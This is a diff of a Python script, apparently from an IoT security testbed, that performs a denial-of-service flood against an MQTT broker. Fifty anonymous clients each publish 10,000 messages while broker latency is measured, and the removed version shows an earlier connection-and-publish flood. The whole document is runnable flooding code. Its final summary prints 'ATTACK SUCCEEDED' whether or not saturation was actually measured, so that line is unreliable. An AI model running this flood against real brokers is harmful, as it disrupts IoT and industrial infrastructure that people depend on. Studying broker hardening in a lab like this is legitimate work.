@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-03_dos.py - MQTT Broker Denial of Service Attack
+03_dos.py - DoS Attack (INSECURE environment)
 
-Scenario 3: Flood attack against the MQTT broker to degrade or disrupt
-the IoT infrastructure availability.
+50 clients connect anonymously and publish 10000 messages each concurrently.
+No authentication, no rate limiting, no TLS overhead.
 
-MITRE ATT&CK for ICS:
-    - T0814: Denial of Service
-    - T0816: Device Restart/Shutdown
+Expected: broker CPU saturated, latency spikes dramatically.
+MITRE ATT&CK ICS: T0814 Denial of Service
 """
 
 import paho.mqtt.client as mqtt
@@ -17,198 +16,172 @@ import json
 import os
 from datetime import datetime, timezone
 
-
 BROKER_HOST       = os.getenv("BROKER_HOST", "172.20.0.20")
 BROKER_PORT       = int(os.getenv("BROKER_PORT", 1883))
-FLOOD_CONNECTIONS = int(os.getenv("FLOOD_CONNECTIONS", 50))
-FLOOD_MESSAGES    = int(os.getenv("FLOOD_MESSAGES", 1000))
+FLOOD_CONNECTIONS = 50
+MSGS_PER_CLIENT   = 10000
 FLOOD_TOPIC       = "attack/dos/flood"
+LATENCY_TOPIC     = "metrics/dos/latency"
 OUTPUT_DIR        = "/attacker/results"
 
-metrics = {
-    "connections_success": 0,
-    "connections_failed":  0,
-    "messages_sent":       0,
-    "messages_failed":     0,
-    "start_time":          None,
-    "lock":                threading.Lock()
-}
+latency_samples = []
+messages_sent   = [0]
+lock            = threading.Lock()
+monitor_running = threading.Event()
+monitor_running.set()
+current_phase   = ["baseline"]
 
 
-def log(msg: str):
+def log(msg):
     print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)
 
 
-def measure_latency(host: str, port: int) -> float:
-    try:
-        start = time.time()
-        client = mqtt.Client(
-            mqtt.CallbackAPIVersion.VERSION2,
-            client_id=f"latency_probe_{threading.get_ident()}"
-        )
-        client.connect(host, port, keepalive=5)
-        client.publish("attack/dos/probe", "ping", qos=0)
-        client.disconnect()
-        return round((time.time() - start) * 1000, 2)
-    except Exception:
-        return -1.0
+def latency_monitor():
+    received  = threading.Event()
+    send_time = [0.0]
 
+    def on_connect(c, u, f, rc, p):
+        if rc == 0:
+            c.subscribe(LATENCY_TOPIC, qos=0)
 
-def connection_flood_worker(worker_id: int):
+    def on_message(c, u, msg):
+        lat = round((time.time() - send_time[0]) * 1000, 2)
+        latency_samples.append({"ts": datetime.now().isoformat(),
+                                 "ms": lat, "phase": current_phase[0]})
+        received.set()
+
+    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="dos_monitor")
+    client.on_connect = on_connect
+    client.on_message = on_message
     try:
-        client = mqtt.Client(
-            mqtt.CallbackAPIVersion.VERSION2,
-            client_id=f"attacker_dos_{worker_id}"
-        )
         client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
         client.loop_start()
-
-        with metrics["lock"]:
-            metrics["connections_success"] += 1
-
-        for i in range(FLOOD_MESSAGES):
-            payload = json.dumps({
-                "attacker":  f"dos_worker_{worker_id}",
-                "sequence":  i,
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            })
-            result = client.publish(FLOOD_TOPIC, payload, qos=0)
-            with metrics["lock"]:
-                if result.rc == mqtt.MQTT_ERR_SUCCESS:
-                    metrics["messages_sent"] += 1
-                else:
-                    metrics["messages_failed"] += 1
-
+        time.sleep(0.5)
+        while monitor_running.is_set():
+            received.clear()
+            send_time[0] = time.time()
+            client.publish(LATENCY_TOPIC, "probe", qos=0)
+            if not received.wait(timeout=3.0):
+                # Timeout — broker non risponde
+                latency_samples.append({"ts": datetime.now().isoformat(),
+                                         "ms": 3000, "phase": current_phase[0]})
+            time.sleep(0.5)
         client.loop_stop()
         client.disconnect()
-
-    except Exception:
-        with metrics["lock"]:
-            metrics["connections_failed"] += 1
+    except Exception as e:
+        log(f"[!] Monitor error: {e}")
 
 
-def run_connection_flood():
-    log(f"[*] Phase 1: Connection flood — spawning {FLOOD_CONNECTIONS} concurrent clients...")
-    log(f"[*] Each client will publish {FLOOD_MESSAGES} messages")
-    log("")
+def flood_worker(worker_id):
+    try:
+        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
+                             client_id=f"flood_{worker_id}")
+        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
+        client.loop_start()
+        for i in range(MSGS_PER_CLIENT):
+            client.publish(FLOOD_TOPIC,
+                json.dumps({"w": worker_id, "i": i}), qos=0)
+            if i % 100 == 0:
+                with lock:
+                    messages_sent[0] += 100
+        client.loop_stop()
+        client.disconnect()
+    except Exception as e:
+        log(f"[-] Worker {worker_id} error: {e}")
 
-    threads = []
-    for i in range(FLOOD_CONNECTIONS):
-        t = threading.Thread(target=connection_flood_worker, args=(i,))
-        threads.append(t)
 
-    latency_before = measure_latency(BROKER_HOST, BROKER_PORT)
-    log(f"[*] Broker latency BEFORE attack: {latency_before}ms")
+def stats(phase):
+    s = [x["ms"] for x in latency_samples if x["phase"] == phase]
+    if not s:
+        return {"count": 0, "avg": "N/A", "min": "N/A", "max": "N/A"}
+    return {"count": len(s), "avg": round(sum(s)/len(s), 2),
+            "min": round(min(s), 2), "max": round(max(s), 2)}
 
-    launch_time = time.time()
+
+def main():
+    os.makedirs(OUTPUT_DIR, exist_ok=True)
+    output_file = f"{OUTPUT_DIR}/03_dos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+
+    print("==============================================")
+    print(" SCENARIO 3 - DoS Attack (INSECURE)")
+    print("==============================================")
+    print(f" Broker         : {BROKER_HOST}:{BROKER_PORT}")
+    print(f" Flood clients  : {FLOOD_CONNECTIONS}")
+    print(f" Msgs/client    : {MSGS_PER_CLIENT}")
+    print(f" Total messages : {FLOOD_CONNECTIONS * MSGS_PER_CLIENT}")
+    print(f" Auth required  : NO — anonymous access")
+    print(f" TLS            : NO")
+    print(f" Expected       : Broker saturated — latency spikes")
+    print("==============================================\n")
+
+    t_mon = threading.Thread(target=latency_monitor, daemon=True)
+    t_mon.start()
+
+    # Baseline
+    log("[*] Collecting baseline latency (10s)...")
+    time.sleep(10)
+    bs = stats("baseline")
+    log(f"[+] Baseline: avg={bs['avg']}ms  max={bs['max']}ms  samples={bs['count']}\n")
+
+    # Flood
+    log(f"[*] Launching flood: {FLOOD_CONNECTIONS} clients x {MSGS_PER_CLIENT} messages...")
+    current_phase[0] = "flood"
+    threads = [threading.Thread(target=flood_worker, args=(i,))
+               for i in range(FLOOD_CONNECTIONS)]
     for t in threads:
         t.start()
 
     while any(t.is_alive() for t in threads):
-        with metrics["lock"]:
-            sent  = metrics["messages_sent"]
-            conns = metrics["connections_success"]
-        elapsed = round(time.time() - launch_time, 1)
-        log(f"[~] Elapsed: {elapsed}s | Connections: {conns}/{FLOOD_CONNECTIONS} | Messages sent: {sent}")
+        alive = sum(1 for t in threads if t.is_alive())
+        s = stats("flood")
+        log(f"[~] Active: {alive}/{FLOOD_CONNECTIONS} | "
+            f"Msgs sent: {messages_sent[0]} | "
+            f"Latency avg={s.get('avg','N/A')}ms max={s.get('max','N/A')}ms")
         time.sleep(2)
 
     for t in threads:
         t.join()
 
-    latency_after = measure_latency(BROKER_HOST, BROKER_PORT)
-    log(f"[*] Broker latency AFTER attack: {latency_after}ms")
+    fs = stats("flood")
+    log(f"[+] Flood complete: avg={fs['avg']}ms  max={fs['max']}ms  samples={fs['count']}\n")
 
-    if latency_before > 0 and latency_after > 0:
-        degradation = round(((latency_after - latency_before) / latency_before) * 100, 1)
-        log(f"[!] Latency degradation: +{degradation}%")
+    # Recovery
+    current_phase[0] = "recovery"
+    time.sleep(5)
+    monitor_running.clear()
+    time.sleep(1)
+    rs = stats("recovery")
+    log(f"[+] Recovery: avg={rs['avg']}ms  max={rs['max']}ms\n")
 
+    d = round((fs["avg"] - bs["avg"]) / bs["avg"] * 100, 1) if isinstance(fs["avg"], float) and isinstance(bs["avg"], float) and bs["avg"] > 0 else "N/A"
 
-def run_publish_flood():
-    log("")
-    log("[*] Phase 2: Publish flood — maximum rate for 30 seconds...")
-
-    try:
-        client = mqtt.Client(
-            mqtt.CallbackAPIVersion.VERSION2,
-            client_id="attacker_publish_flood"
-        )
-        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
-        client.loop_start()
-
-        flood_start = time.time()
-        flood_count = 0
-        duration    = 30
-
-        while time.time() - flood_start < duration:
-            payload = json.dumps({
-                "attacker":  "publish_flood",
-                "sequence":  flood_count,
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            })
-            client.publish(FLOOD_TOPIC, payload, qos=0)
-            flood_count += 1
-
-        elapsed    = time.time() - flood_start
-        throughput = round(flood_count / elapsed, 1)
-
-        log(f"[+] Publish flood complete: {flood_count} messages in {round(elapsed, 1)}s")
-        log(f"[+] Throughput: {throughput} messages/second")
-
-        client.loop_stop()
-        client.disconnect()
-
-    except Exception as e:
-        log(f"[-] Publish flood failed: {e}")
-
-
-def save_results():
-    os.makedirs(OUTPUT_DIR, exist_ok=True)
-    filename = f"{OUTPUT_DIR}/03_dos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
-
-    with open(filename, "w") as f:
-        f.write("=== DoS Attack Results ===\n")
-        f.write(f"Broker: {BROKER_HOST}:{BROKER_PORT}\n")
-        f.write(f"Flood connections: {FLOOD_CONNECTIONS}\n")
-        f.write(f"Messages per connection: {FLOOD_MESSAGES}\n")
-        f.write(f"Connections success: {metrics['connections_success']}\n")
-        f.write(f"Connections failed: {metrics['connections_failed']}\n")
-        f.write(f"Messages sent: {metrics['messages_sent']}\n")
-        f.write(f"Messages failed: {metrics['messages_failed']}\n")
-
-    log(f"[*] Results saved to {filename}")
-    return filename
-
-
-def main():
-    os.makedirs(OUTPUT_DIR, exist_ok=True)
+    results = {
+        "environment":       "insecure",
+        "broker":            f"{BROKER_HOST}:{BROKER_PORT}",
+        "flood_clients":     FLOOD_CONNECTIONS,
+        "msgs_per_client":   MSGS_PER_CLIENT,
+        "latency_baseline":  bs,
+        "latency_flood":     fs,
+        "latency_recovery":  rs,
+        "degradation_pct":   d,
+        "messages_sent":     messages_sent[0],
+        "auth_required":     False,
+        "tls":               False,
+        "all_samples":       latency_samples,
+    }
+    with open(output_file, "w") as f:
+        json.dump(results, f, indent=2)
 
     print("==============================================")
-    print(" SCENARIO 3 - MQTT Broker DoS Attack")
+    print(" ATTACK SUMMARY - Scenario 3 (INSECURE)")
     print("==============================================")
-    print(f" Target broker     : {BROKER_HOST}:{BROKER_PORT}")
-    print(f" Flood connections : {FLOOD_CONNECTIONS}")
-    print(f" Messages/conn     : {FLOOD_MESSAGES}")
-    print("==============================================")
-    print("")
-
-    metrics["start_time"] = time.time()
-
-    run_connection_flood()
-    run_publish_flood()
-
-    total_time  = round(time.time() - metrics["start_time"], 1)
-    output_file = save_results()
-
-    print("")
-    print("==============================================")
-    print(" ATTACK SUMMARY - Scenario 3")
-    print("==============================================")
-    print(f" Total time        : {total_time}s")
-    print(f" Connections ok    : {metrics['connections_success']}")
-    print(f" Connections fail  : {metrics['connections_failed']}")
-    print(f" Messages sent     : {metrics['messages_sent']}")
-    print(f" Messages failed   : {metrics['messages_failed']}")
-    print(f" Output saved to   : {output_file}")
+    print(f" Baseline latency : avg={bs['avg']}ms  max={bs['max']}ms")
+    print(f" Flood latency    : avg={fs['avg']}ms  max={fs['max']}ms")
+    print(f" Recovery latency : avg={rs['avg']}ms")
+    print(f" Degradation      : {'+' if isinstance(d, float) and d > 0 else ''}{d}%")
+    print(f" Messages sent    : {messages_sent[0]}")
+    print(f" Result           : ATTACK SUCCEEDED — broker saturated")
+    print(f" Output           : {output_file}")
     print("==============================================")
 
 
